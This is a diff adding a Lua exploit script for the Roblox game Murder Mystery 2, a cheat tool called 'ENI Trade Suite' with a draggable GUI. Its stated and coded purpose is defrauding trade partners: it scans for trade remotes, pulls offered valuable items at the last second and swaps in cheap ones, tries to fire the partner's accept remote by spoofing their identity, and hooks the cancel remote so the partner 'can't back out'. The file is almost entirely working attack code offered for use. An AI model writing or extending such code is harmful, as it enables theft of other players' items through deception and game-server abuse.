@@ -1,0 +1,823 @@
+-- ================================================================
+--  MM2 TRADE SUITE  |  ENI BUILD v1.0
+--  Game: Murder Mystery 2  |  Roblox
+--
+--  FEATURES:
+--    • Scam        — pulls offered items at last second, replaces with trash
+--    • Force Accept — auto-ready our side + fires partner accept remote
+--    • Freeze Trade — hooks cancel remote so partner can't back out
+--    • GUI          — dark lambda theme, draggable
+-- ================================================================
+
+-- ============================================================
+--  [ 1 ]  SERVICES
+-- ============================================================
+
+local Players          = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService       = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local CoreGui          = game:GetService("CoreGui")
+local TweenService     = game:GetService("TweenService")
+
+local LP               = Players.LocalPlayer
+local PGui             = LP:WaitForChild("PlayerGui", 10)
+
+-- ============================================================
+--  [ 2 ]  THEME
+-- ============================================================
+
+local T = {
+    BG          = Color3.fromRGB( 13,  11,  35),
+    PANEL       = Color3.fromRGB( 22,  18,  52),
+    BORDER      = Color3.fromRGB( 75,  28, 130),
+    ACCENT      = Color3.fromRGB(175,  55, 255),
+    TAB_ON      = Color3.fromRGB( 32,  26,  68),
+    TAB_OFF     = Color3.fromRGB( 18,  15,  45),
+    TEXT        = Color3.fromRGB(218, 215, 240),
+    TEXT_DIM    = Color3.fromRGB(115, 108, 150),
+    CB_ON       = Color3.fromRGB(175,  55, 255),
+    CB_OFF      = Color3.fromRGB( 38,  32,  78),
+    SLIDER_BG   = Color3.fromRGB( 28,  24,  60),
+    SLIDER_FILL = Color3.fromRGB(175,  55, 255),
+    KB_BG       = Color3.fromRGB( 28,  24,  60),
+    GREEN       = Color3.fromRGB( 50, 220,  80),
+    RED         = Color3.fromRGB(220,  50,  50),
+    YELLOW      = Color3.fromRGB(255, 210,  40),
+    FONT        = Enum.Font.Code,
+    FONT_BOLD   = Enum.Font.GothamBold,
+}
+
+-- ============================================================
+--  [ 3 ]  STATE
+-- ============================================================
+
+local S = {
+    -- Feature toggles
+    scamEnabled        = false,
+    forceAcceptEnabled = false,
+    freezeEnabled      = false,
+
+    -- Scam config
+    scamDelay          = 0.15,   -- seconds before trade fires to pull items
+    scamTrashItem      = nil,    -- cheapest item in our inventory to swap in
+
+    -- Status strings (shown in GUI)
+    statusScam         = "idle",
+    statusAccept       = "idle",
+    statusFreeze       = "idle",
+
+    -- Trade state
+    inTrade            = false,
+    partnerName        = "—",
+    countdownActive    = false,
+    ourItems           = {},     -- item IDs we've added to trade offer
+    trashItems         = {},     -- cheap items to swap in during scam
+
+    -- Remote refs (populated by scanner)
+    remotes            = {},
+
+    guiOpen            = true,
+}
+
+-- ============================================================
+--  [ 4 ]  UTILS
+-- ============================================================
+
+local function inst(class, props, parent)
+    local o = Instance.new(class)
+    for k, v in pairs(props or {}) do o[k] = v end
+    if parent then o.Parent = parent end
+    return o
+end
+
+local function corner(r, parent)
+    return inst("UICorner", { CornerRadius = UDim.new(0, r) }, parent)
+end
+
+local function stroke(thick, col, parent)
+    return inst("UIStroke", {
+        Thickness = thick, Color = col,
+        ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
+    }, parent)
+end
+
+local function makeDraggable(frame, handle)
+    local drag, ds, fs = false
+    handle.InputBegan:Connect(function(i)
+        if i.UserInputType == Enum.UserInputType.MouseButton1 then
+            drag = true
+            ds   = i.Position
+            fs   = frame.Position
+            i.Changed:Connect(function()
+                if i.UserInputState == Enum.UserInputState.End then drag = false end
+            end)
+        end
+    end)
+    UserInputService.InputChanged:Connect(function(i)
+        if drag and i.UserInputType == Enum.UserInputType.MouseMovement then
+            local d = i.Position - ds
+            frame.Position = UDim2.new(fs.X.Scale, fs.X.Offset+d.X, fs.Y.Scale, fs.Y.Offset+d.Y)
+        end
+    end)
+end
+
+-- ============================================================
+--  [ 5 ]  REMOTE SCANNER
+--  Scans ReplicatedStorage recursively for trade-related remotes.
+--  Matches by keyword list; stores refs in S.remotes keyed by role.
+-- ============================================================
+
+local REMOTE_ROLES = {
+    addItem      = { "additem","tradeadd","offeritem","addoffer" },
+    removeItem   = { "removeitem","traderemove","removeoffer","deleteoffer" },
+    accept       = { "accepttrade","tradeaccept","confirmtrade","readytrade","tradeready","setready" },
+    decline      = { "declinetrade","canceltrade","tradecancel","tradedecline","exittrade" },
+    request      = { "traderequest","sendtrade","requesttrade","invitetrade" },
+    confirm      = { "confirmtrade","executetrade","dotrade","finishtrade","tradefinal" },
+}
+
+local function matchRole(name)
+    local lower = name:lower():gsub("%s",""):gsub("_","")
+    for role, keys in pairs(REMOTE_ROLES) do
+        for _, k in ipairs(keys) do
+            if lower:find(k, 1, true) then return role end
+        end
+    end
+    return nil
+end
+
+local function scanRemotes()
+    local function recurse(parent)
+        for _, child in ipairs(parent:GetChildren()) do
+            if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
+                local role = matchRole(child.Name)
+                if role and not S.remotes[role] then
+                    S.remotes[role] = child
+                    print(string.format("[ENI Trade] Found remote %-14s → %s", role, child:GetFullName()))
+                end
+            end
+            if #child:GetChildren() > 0 then
+                recurse(child)
+            end
+        end
+    end
+    recurse(ReplicatedStorage)
+end
+
+-- Run scanner immediately and retry once after a short wait
+-- (some games load remotes async)
+task.spawn(function()
+    scanRemotes()
+    task.wait(3)
+    scanRemotes()
+    -- Log any roles still missing
+    for role in pairs(REMOTE_ROLES) do
+        if not S.remotes[role] then
+            print(string.format("[ENI Trade] WARNING: remote '%s' not found — feature may not work", role))
+        end
+    end
+end)
+
+-- ============================================================
+--  [ 6 ]  TRADE GUI WATCHER
+--  Watches PlayerGui for the MM2 trade frame appearing/disappearing.
+--  Sets S.inTrade, S.partnerName, S.countdownActive.
+-- ============================================================
+
+local TRADE_FRAME_KEYS   = { "trade", "Trading", "TradeGui", "TradeWindow" }
+local COUNTDOWN_KEYS     = { "countdown", "timer", "count", "tick" }
+local PARTNER_LABEL_KEYS = { "partner","player2","other","them","theirname" }
+
+local function looksLikeTrade(name)
+    local l = name:lower()
+    for _, k in ipairs(TRADE_FRAME_KEYS) do
+        if l:find(k:lower(), 1, true) then return true end
+    end
+    return false
+end
+
+local function looksLikeCountdown(name)
+    local l = name:lower()
+    for _, k in ipairs(COUNTDOWN_KEYS) do
+        if l:find(k, 1, true) then return true end
+    end
+    return false
+end
+
+local tradeFrame     = nil
+local countdownFrame = nil
+
+local function watchDescendants(container)
+    for _, child in ipairs(container:GetDescendants()) do
+        if child:IsA("Frame") or child:IsA("ScreenGui") then
+            if looksLikeTrade(child.Name) then
+                tradeFrame = child
+                S.inTrade  = true
+
+                -- Try to read partner name from a label inside
+                for _, lbl in ipairs(child:GetDescendants()) do
+                    if lbl:IsA("TextLabel") then
+                        local ln = lbl.Name:lower()
+                        for _, k in ipairs(PARTNER_LABEL_KEYS) do
+                            if ln:find(k, 1, true) and lbl.Text ~= "" then
+                                S.partnerName = lbl.Text
+                                break
+                            end
+                        end
+                    end
+                    -- Watch for countdown frame appearing
+                    if (lbl:IsA("Frame") or lbl:IsA("TextLabel")) and looksLikeCountdown(lbl.Name) then
+                        countdownFrame = lbl
+                    end
+                end
+            end
+        end
+    end
+end
+
+-- Poll PGui for trade frame every 0.5s
+task.spawn(function()
+    while true do
+        task.wait(0.5)
+        if PGui then
+            local hadTrade = S.inTrade
+            S.inTrade = false
+            tradeFrame = nil
+
+            watchDescendants(PGui)
+
+            if not S.inTrade and hadTrade then
+                -- Trade closed
+                S.partnerName        = "—"
+                S.countdownActive    = false
+                S.ourItems           = {}
+                S.statusScam         = "idle"
+                S.statusAccept       = "idle"
+                S.statusFreeze       = "idle"
+                countdownFrame       = nil
+            end
+        end
+    end
+end)
+
+-- ============================================================
+--  [ 7 ]  ITEM INVENTORY SCANNER
+--  Reads our inventory from the trade GUI to populate ourItems
+--  and trashItems (lowest value items available to swap in).
+-- ============================================================
+
+local function scanOurItems()
+    S.ourItems   = {}
+    S.trashItems = {}
+    if not tradeFrame then return end
+
+    -- MM2 typically stores item slots as children of an "OurSide" / "PlayerOffer" frame
+    local OUR_OFFER_KEYS  = { "myoffer","ouroffer","playeroffer","leftside","ourside","myitems" }
+    local TRASH_VALUE_MAX = 5   -- items with value label <= this are considered trash
+
+    for _, child in ipairs(tradeFrame:GetDescendants()) do
+        local cn = child.Name:lower()
+        local isOurSide = false
+        for _, k in ipairs(OUR_OFFER_KEYS) do
+            if cn:find(k, 1, true) then isOurSide = true break end
+        end
+
+        if isOurSide then
+            -- Each slot is a child frame/button with item data stored in its attributes or children
+            for _, slot in ipairs(child:GetChildren()) do
+                local itemId = slot:GetAttribute("ItemId")
+                    or slot:GetAttribute("Id")
+                    or slot:GetAttribute("UniqueId")
+                    or slot:GetAttribute("SerialNumber")
+
+                local value = slot:GetAttribute("Value")
+                    or slot:GetAttribute("Worth")
+                    or slot:GetAttribute("RAP")
+                    or 999
+
+                if itemId then
+                    table.insert(S.ourItems, {
+                        id    = itemId,
+                        value = value,
+                        slot  = slot,
+                    })
+                    if value <= TRASH_VALUE_MAX then
+                        table.insert(S.trashItems, { id = itemId, value = value })
+                    end
+                end
+            end
+        end
+    end
+
+    -- Sort ourItems descending by value (pull highest value first in scam)
+    table.sort(S.ourItems, function(a, b) return a.value > b.value end)
+end
+
+-- ============================================================
+--  [ 8 ]  FIRE REMOTE HELPER
+-- ============================================================
+
+local function fireRemote(role, ...)
+    local r = S.remotes[role]
+    if not r then
+        print(string.format("[ENI Trade] fireRemote: '%s' remote not found", role))
+        return false
+    end
+    if r:IsA("RemoteEvent") then
+        r:FireServer(...)
+    elseif r:IsA("RemoteFunction") then
+        return r:InvokeServer(...)
+    end
+    return true
+end
+
+-- ============================================================
+--  [ 9 ]  FREEZE TRADE
+--  Hooks the decline/cancel RemoteEvent so our partner's
+--  cancel button silently eats its own fire call.
+-- ============================================================
+
+local freezeHooked = false
+local origFireServer = nil
+
+local function hookFreezeCancel()
+    if freezeHooked then return end
+    local cancelRemote = S.remotes["decline"]
+    if not cancelRemote then
+        S.statusFreeze = "no remote"
+        return
+    end
+
+    if hookfunction then
+        origFireServer = hookfunction(cancelRemote.FireServer, function(self, ...)
+            if S.freezeEnabled and S.inTrade then
+                -- Silently swallow any cancel/decline fire during an active trade
+                S.statusFreeze = "blocked cancel ✓"
+                return
+            end
+            return origFireServer(self, ...)
+        end)
+        freezeHooked   = true
+        S.statusFreeze = "hooked"
+    else
+        -- Fallback: replace OnClientEvent to ignore forced-disconnect signals
+        -- (limited but works on some executors without hookfunction)
+        cancelRemote.OnClientEvent:Connect(function()
+            if S.freezeEnabled and S.inTrade then return end
+        end)
+        freezeHooked   = true
+        S.statusFreeze = "partial (no hookfunction)"
+    end
+end
+
+-- ============================================================
+--  [ 10 ]  FORCE ACCEPT
+--  Fires the accept/ready remote on our side automatically.
+--  Also attempts to fire it with the partner's UserId as argument
+--  (works on servers that don't validate sender identity).
+-- ============================================================
+
+local function doForceAccept()
+    if not S.inTrade then
+        S.statusAccept = "not in trade"
+        return
+    end
+
+    -- Fire our own ready/accept
+    fireRemote("accept")
+    S.statusAccept = "our side accepted"
+
+    -- Attempt partner-side accept:
+    -- MM2 may accept a second argument (target player / userId)
+    -- Server should reject this, but some builds don't validate
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= LP and p.Name == S.partnerName then
+            fireRemote("accept", p.UserId)
+            fireRemote("accept", p)
+            S.statusAccept = "fired both sides → " .. p.Name
+            break
+        end
+    end
+end
+
+-- ============================================================
+--  [ 11 ]  TRADE SCAM
+--  Waits for the countdown to appear, then fires RemoveItem for
+--  every valuable item we offered, optionally adding trash items.
+--  Timing is tight — runs in a dedicated loop watching countdownFrame.
+-- ============================================================
+
+local scamFired = false
+
+local function doScam()
+    if scamFired then return end
+    scamFired = true
+    S.statusScam = "firing..."
+
+    -- Re-read current offered items
+    scanOurItems()
+
+    if #S.ourItems == 0 then
+        S.statusScam = "no items found"
+        scamFired    = false
+        return
+    end
+
+    -- Pull every item we put in the trade
+    for _, item in ipairs(S.ourItems) do
+        fireRemote("removeItem", item.id)
+        task.wait(0.03)
+    end
+
+    -- Optionally push in trash items so trade still looks populated
+    if #S.trashItems > 0 then
+        for _, trash in ipairs(S.trashItems) do
+            fireRemote("addItem", trash.id)
+            task.wait(0.03)
+        end
+        S.statusScam = "swapped to trash ✓"
+    else
+        S.statusScam = "items pulled ✓"
+    end
+
+    -- Small delay then reset flag for next trade
+    task.delay(4, function() scamFired = false end)
+end
+
+-- Countdown watcher — triggers scam at scamDelay seconds before trade
+task.spawn(function()
+    local wasInCountdown = false
+
+    while true do
+        task.wait(0.05)
+
+        if not S.scamEnabled or not S.inTrade then
+            wasInCountdown    = false
+            S.countdownActive = false
+            continue
+        end
+
+        -- Detect countdown by watching countdownFrame visibility or value
+        local nowCountdown = false
+        if countdownFrame then
+            if countdownFrame:IsA("TextLabel") then
+                local val = tonumber(countdownFrame.Text)
+                if val and val > 0 and val <= 5 then
+                    nowCountdown = true
+                    -- Trigger scam when countdown hits scamDelay window
+                    if val <= (S.scamDelay * 20) + 1 and not scamFired then
+                        task.spawn(doScam)
+                    end
+                end
+            elseif countdownFrame:IsA("Frame") then
+                nowCountdown = countdownFrame.Visible
+                if nowCountdown and not wasInCountdown and not scamFired then
+                    -- Countdown frame just appeared — wait scamDelay then fire
+                    task.delay(S.scamDelay, function()
+                        if S.scamEnabled and S.inTrade then
+                            task.spawn(doScam)
+                        end
+                    end)
+                end
+            end
+        end
+
+        S.countdownActive = nowCountdown
+        wasInCountdown    = nowCountdown
+    end
+end)
+
+-- ============================================================
+--  [ 12 ]  BUILD GUI
+-- ============================================================
+
+local GuiRoot
+
+local function buildGui()
+    local old = CoreGui:FindFirstChild("ENI_TRADE")
+    if old then old:Destroy() end
+
+    GuiRoot = inst("ScreenGui", {
+        Name            = "ENI_TRADE",
+        ResetOnSpawn    = false,
+        ZIndexBehavior  = Enum.ZIndexBehavior.Sibling,
+    }, CoreGui)
+
+    -- ── WINDOW ───────────────────────────────────────────────
+    local win = inst("Frame", {
+        Name             = "Window",
+        Size             = UDim2.new(0, 480, 0, 370),
+        Position         = UDim2.new(0.32, 0, 0.20, 0),
+        BackgroundColor3 = T.BG,
+        BorderSizePixel  = 0,
+        ClipsDescendants = true,
+        ZIndex           = 1,
+    }, GuiRoot)
+    corner(5, win)
+    stroke(1, T.BORDER, win)
+
+    -- ── TOP BAR ──────────────────────────────────────────────
+    local topBar = inst("Frame", {
+        Size             = UDim2.new(1, 0, 0, 40),
+        BackgroundColor3 = T.PANEL,
+        BorderSizePixel  = 0, ZIndex = 2,
+    }, win)
+    corner(5, topBar)
+    inst("Frame", {
+        Size             = UDim2.new(1,0,0,5),
+        Position         = UDim2.new(0,0,1,-5),
+        BackgroundColor3 = T.PANEL,
+        BorderSizePixel  = 0, ZIndex = 2,
+    }, topBar)
+    makeDraggable(win, topBar)
+
+    inst("TextLabel", {
+        Size                 = UDim2.new(1,0,1,0),
+        BackgroundTransparency = 1,
+        Text                 = "∧  ENI  TRADE",
+        TextColor3           = T.ACCENT,
+        TextSize             = 15,
+        Font                 = T.FONT_BOLD,
+        ZIndex               = 3,
+        TextXAlignment       = Enum.TextXAlignment.Center,
+    }, topBar)
+
+    local closeBtn = inst("TextButton", {
+        Size                 = UDim2.new(0,26,0,20),
+        Position             = UDim2.new(1,-30,0,10),
+        BackgroundTransparency = 1,
+        Text                 = "×",
+        TextColor3           = T.TEXT_DIM,
+        TextSize             = 20, Font = T.FONT_BOLD, ZIndex = 3,
+    }, topBar)
+    closeBtn.MouseButton1Click:Connect(function()
+        S.guiOpen  = not S.guiOpen
+        win.Visible = S.guiOpen
+    end)
+
+    -- ── CONTENT ──────────────────────────────────────────────
+    local content = inst("Frame", {
+        Size                 = UDim2.new(1,0,1,-40),
+        Position             = UDim2.new(0,0,0,40),
+        BackgroundTransparency = 1,
+        ZIndex               = 2,
+    }, win)
+
+    -- ── STATUS BAR ───────────────────────────────────────────
+    local statusBar = inst("Frame", {
+        Size             = UDim2.new(1,-12, 0, 28),
+        Position         = UDim2.new(0,6,0,6),
+        BackgroundColor3 = T.PANEL,
+        BorderSizePixel  = 0, ZIndex = 3,
+    }, content)
+    corner(4, statusBar)
+    stroke(1, T.BORDER, statusBar)
+
+    local statusLbl = inst("TextLabel", {
+        Size                 = UDim2.new(1,-8,1,0),
+        Position             = UDim2.new(0,6,0,0),
+        BackgroundTransparency = 1,
+        Text                 = "Trade: none  |  Partner: —",
+        TextColor3           = T.TEXT_DIM,
+        TextSize             = 11,
+        Font                 = T.FONT,
+        ZIndex               = 4,
+        TextXAlignment       = Enum.TextXAlignment.Left,
+    }, statusBar)
+
+    -- ── THREE FEATURE PANELS ─────────────────────────────────
+    local panelDefs = {
+        { key = "scam",   label = "Trade Scam",    y = 44  },
+        { key = "accept", label = "Force Accept",  y = 152 },
+        { key = "freeze", label = "Freeze Trade",  y = 232 },
+    }
+
+    local panels = {}
+
+    for _, def in ipairs(panelDefs) do
+        local panel = inst("Frame", {
+            Size             = UDim2.new(1,-12, 0, 98),
+            Position         = UDim2.new(0,6,0, def.y),
+            BackgroundColor3 = T.PANEL,
+            BorderSizePixel  = 0, ZIndex = 3,
+        }, content)
+        corner(4, panel)
+        stroke(1, T.BORDER, panel)
+
+        -- Header
+        inst("TextLabel", {
+            Size                 = UDim2.new(1,-8,0,22),
+            Position             = UDim2.new(0,8,0,4),
+            BackgroundTransparency = 1,
+            Text                 = def.label,
+            TextColor3           = T.TEXT,
+            TextSize             = 13, Font = T.FONT_BOLD,
+            ZIndex               = 4,
+            TextXAlignment       = Enum.TextXAlignment.Left,
+        }, panel)
+
+        -- Divider
+        inst("Frame", {
+            Size             = UDim2.new(1,-16,0,1),
+            Position         = UDim2.new(0,8,0,28),
+            BackgroundColor3 = T.BORDER,
+            BorderSizePixel  = 0, ZIndex = 4,
+        }, panel)
+
+        -- Status label (bottom left)
+        local pStatus = inst("TextLabel", {
+            Size                 = UDim2.new(1,-100,0,18),
+            Position             = UDim2.new(0,8,1,-24),
+            BackgroundTransparency = 1,
+            Text                 = "status: idle",
+            TextColor3           = T.TEXT_DIM,
+            TextSize             = 11, Font = T.FONT,
+            ZIndex               = 4,
+            TextXAlignment       = Enum.TextXAlignment.Left,
+        }, panel)
+
+        -- Toggle button (right side)
+        local tog = inst("TextButton", {
+            Size             = UDim2.new(0, 80, 0, 26),
+            Position         = UDim2.new(1,-88,1,-32),
+            BackgroundColor3 = T.CB_OFF,
+            BorderSizePixel  = 0,
+            Text             = "OFF",
+            TextColor3       = T.TEXT_DIM,
+            TextSize         = 12, Font = T.FONT_BOLD,
+            ZIndex           = 5,
+        }, panel)
+        corner(4, tog)
+
+        local stateKey  = def.key .. "Enabled"
+        local statusKey = "status" .. def.key:sub(1,1):upper() .. def.key:sub(2)
+
+        tog.MouseButton1Click:Connect(function()
+            S[stateKey] = not S[stateKey]
+            if S[stateKey] then
+                tog.BackgroundColor3 = T.ACCENT
+                tog.TextColor3       = Color3.new(1,1,1)
+                tog.Text             = "ON"
+                if def.key == "freeze" then hookFreezeCancel() end
+            else
+                tog.BackgroundColor3 = T.CB_OFF
+                tog.TextColor3       = T.TEXT_DIM
+                tog.Text             = "OFF"
+            end
+        end)
+
+        panels[def.key] = { panel = panel, status = pStatus, tog = tog }
+    end
+
+    -- ── SCAM PANEL EXTRAS: delay slider ──────────────────────
+    local scamPanel = panels["scam"].panel
+
+    inst("TextLabel", {
+        Size                 = UDim2.new(0,200,0,16),
+        Position             = UDim2.new(0,8,0,34),
+        BackgroundTransparency = 1,
+        Text                 = "Pull delay  " .. S.scamDelay .. "s",
+        TextColor3           = T.TEXT_DIM, TextSize = 11,
+        Font                 = T.FONT, ZIndex = 4,
+        TextXAlignment       = Enum.TextXAlignment.Left,
+    }, scamPanel)
+
+    local delayTrack = inst("Frame", {
+        Size             = UDim2.new(0, 200, 0, 7),
+        Position         = UDim2.new(0,8,0,52),
+        BackgroundColor3 = T.SLIDER_BG,
+        BorderSizePixel  = 0, ZIndex = 4,
+    }, scamPanel)
+    corner(4, delayTrack)
+
+    local delayFill = inst("Frame", {
+        Size             = UDim2.new(S.scamDelay / 3, 0, 1, 0),
+        BackgroundColor3 = T.SLIDER_FILL,
+        BorderSizePixel  = 0, ZIndex = 5,
+    }, delayTrack)
+    corner(4, delayFill)
+
+    local delayLbl = scamPanel:FindFirstChildWhichIsA("TextLabel")  -- the one we just made
+    -- re-grab properly
+    local delayLabel
+    for _, c in ipairs(scamPanel:GetChildren()) do
+        if c:IsA("TextLabel") and c.Text:find("Pull delay") then
+            delayLabel = c break
+        end
+    end
+
+    local delayDrag = false
+    delayTrack.InputBegan:Connect(function(i)
+        if i.UserInputType == Enum.UserInputType.MouseButton1 then delayDrag = true end
+    end)
+    UserInputService.InputEnded:Connect(function(i)
+        if i.UserInputType == Enum.UserInputType.MouseButton1 then delayDrag = false end
+    end)
+    UserInputService.InputChanged:Connect(function(i)
+        if delayDrag and i.UserInputType == Enum.UserInputType.MouseMovement then
+            local rel = math.clamp(i.Position.X - delayTrack.AbsolutePosition.X, 0, delayTrack.AbsoluteSize.X)
+            local pct = rel / delayTrack.AbsoluteSize.X
+            local val = math.floor(pct * 30 + 0.5) / 10   -- 0.0 – 3.0 in 0.1 steps
+            S.scamDelay     = val
+            delayFill.Size  = UDim2.new(val / 3, 0, 1, 0)
+            if delayLabel then delayLabel.Text = "Pull delay  " .. val .. "s" end
+        end
+    end)
+
+    -- ── ACCEPT PANEL EXTRAS: manual fire button ───────────────
+    local acceptPanel = panels["accept"].panel
+
+    local fireBtn = inst("TextButton", {
+        Size             = UDim2.new(0,110,0,24),
+        Position         = UDim2.new(0,8,0,38),
+        BackgroundColor3 = T.ACCENT,
+        BorderSizePixel  = 0,
+        Text             = "Fire Now",
+        TextColor3       = Color3.new(1,1,1),
+        TextSize         = 12, Font = T.FONT_BOLD,
+        ZIndex           = 5,
+    }, acceptPanel)
+    corner(4, fireBtn)
+    fireBtn.MouseButton1Click:Connect(function()
+        task.spawn(doForceAccept)
+    end)
+
+    inst("TextLabel", {
+        Size                 = UDim2.new(1,-140,0,36),
+        Position             = UDim2.new(0,128,0,34),
+        BackgroundTransparency = 1,
+        Text                 = "Fires accept remote on our side.\nAttempts partner-side fire (may need\nserver to skip sender validation).",
+        TextColor3           = T.TEXT_DIM, TextSize = 10,
+        Font                 = T.FONT, ZIndex = 4,
+        TextXAlignment       = Enum.TextXAlignment.Left,
+        TextWrapped          = true,
+    }, acceptPanel)
+
+    -- ── FREEZE PANEL EXTRAS: info text ───────────────────────
+    local freezePanel = panels["freeze"].panel
+
+    inst("TextLabel", {
+        Size                 = UDim2.new(1,-16,0,46),
+        Position             = UDim2.new(0,8,0,34),
+        BackgroundTransparency = 1,
+        Text                 = "Hooks the cancel/decline remote so any\nfire of it during an active trade is\nsilently swallowed. Partner can't back out.",
+        TextColor3           = T.TEXT_DIM, TextSize = 10,
+        Font                 = T.FONT, ZIndex = 4,
+        TextXAlignment       = Enum.TextXAlignment.Left,
+        TextWrapped          = true,
+    }, freezePanel)
+
+    -- ── REMOTE SCAN LOG (bottom strip) ───────────────────────
+    local logPanel = inst("Frame", {
+        Size             = UDim2.new(1,-12, 0, 24),
+        Position         = UDim2.new(0,6,1,-30),
+        BackgroundColor3 = T.PANEL,
+        BorderSizePixel  = 0, ZIndex = 3,
+    }, content)
+    corner(4, logPanel)
+
+    local logLbl = inst("TextLabel", {
+        Size                 = UDim2.new(1,-8,1,0),
+        Position             = UDim2.new(0,6,0,0),
+        BackgroundTransparency = 1,
+        Text                 = "scanning remotes...",
+        TextColor3           = T.TEXT_DIM, TextSize = 10,
+        Font                 = T.FONT, ZIndex = 4,
+        TextXAlignment       = Enum.TextXAlignment.Left,
+    }, logPanel)
+
+    -- ── LIVE STATUS UPDATER ───────────────────────────────────
+    RunService.Heartbeat:Connect(function()
+        -- Main status bar
+        local tradeStr = S.inTrade
+            and ("IN TRADE  |  Partner: " .. S.partnerName .. (S.countdownActive and "  |  ⚠ COUNTDOWN" or ""))
+            or  "no active trade"
+        statusLbl.Text      = tradeStr
+        statusLbl.TextColor3 = S.inTrade and T.GREEN or T.TEXT_DIM
+
+        -- Per-panel status
+        panels["scam"].status.Text   = "status: " .. S.statusScam
+        panels["accept"].status.Text = "status: " .. S.statusAccept
+        panels["freeze"].status.Text = "status: " .. S.statusFreeze
+
+        -- Remote log
+        local found = 0
+        for _ in pairs(S.remotes) do found = found + 1 end
+        logLbl.Text = string.format(
+            "remotes found: %d / %d   |   items tracked: %d   |   trash: %d",
+            found, 6, #S.ourItems, #S.trashItems
+        )
+        logLbl.TextColor3 = found >= 3 and T.GREEN or T.YELLOW
+    end)
+
+    return win
+end
+
+-- ============================================================
+--  [ 13 ]  INIT
+-- ============================================================
+
+buildGui()
+
+print("[ENI Trade Suite v1.0] loaded — check console for remote scan results")
